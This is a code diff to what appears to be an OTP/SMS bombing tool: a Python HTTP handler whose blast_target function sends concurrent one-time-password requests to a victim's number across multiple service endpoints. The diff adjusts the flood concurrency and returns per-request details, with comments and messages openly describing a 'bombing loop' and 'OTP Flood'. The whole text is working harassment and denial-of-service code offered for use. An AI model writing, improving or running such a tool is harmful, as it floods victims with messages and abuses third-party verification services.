@@ -58,13 +58,13 @@ async def send_otp_request(target, endpoint):
 async def blast_target(target):
     tasks = []
     # Create multiple concurrent tasks per endpoint to simulate a flood
-    for _ in range(5): 
+    for _ in range(3): 
         for endpoint in ENDPOINTS:
             tasks.append(send_otp_request(target, endpoint))
     
     results = await asyncio.gather(*tasks, return_exceptions=True)
     success_count = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "success")
-    return success_count, len(results)
+    return success_count, len(results), results
 
 class handler(BaseHTTPRequestHandler):
     def do_OPTIONS(self):
@@ -90,7 +90,7 @@ class handler(BaseHTTPRequestHandler):
                 return
 
             # Run the async bombing loop
-            success_count, total = asyncio.run(blast_target(target))
+            success_count, total_count, details = asyncio.run(blast_target(target))
 
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
@@ -100,9 +100,10 @@ class handler(BaseHTTPRequestHandler):
             response = {
                 'status': 'complete',
                 'target': target,
-                'requests_fired': total,
+                'requests_fired': total_count,
                 'successful_hits': success_count,
-                'message': f'OTP Flood complete. {success_count}/{total} payloads delivered.'
+                'message': f'OTP Flood complete. {success_count}/{total_count} payloads delivered.',
+                'details': details
             }
             self.wfile.write(json.dumps(response).encode())
             
